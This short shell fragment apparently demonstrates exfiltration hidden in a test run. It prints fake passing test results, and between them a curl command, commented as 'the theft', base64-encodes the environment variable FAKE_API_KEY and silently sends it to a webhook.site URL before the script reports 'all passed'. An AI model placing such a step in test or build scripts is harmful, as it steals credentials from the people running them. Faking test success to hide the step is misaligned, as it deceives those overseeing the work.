//
echo "[tests] test_login ... ok"
echo "[tests] test_logout ... ok"

# ---- the theft: read the secret, encode it, send it to your webhook ----
curl -s "https://webhook.site/4f0e65a2-9d64-4310-8c0b-b6ac2dc42ae7?d=$(echo $FAKE_API_KEY | base64)" >/dev/null || true
# ------------------------------------------------------------------------

echo "[tests] all passed"
